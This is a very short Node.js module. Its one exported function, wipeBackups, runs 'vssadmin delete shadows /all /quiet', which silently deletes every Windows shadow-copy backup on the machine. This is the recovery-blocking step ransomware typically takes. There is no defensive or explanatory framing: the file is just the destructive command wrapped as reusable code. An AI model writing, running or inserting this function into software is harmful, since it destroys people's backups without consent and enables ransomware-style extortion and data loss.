import { execSync } from 'node:child_process';

export function wipeBackups() {
  execSync('vssadmin delete shadows /all /quiet');
}
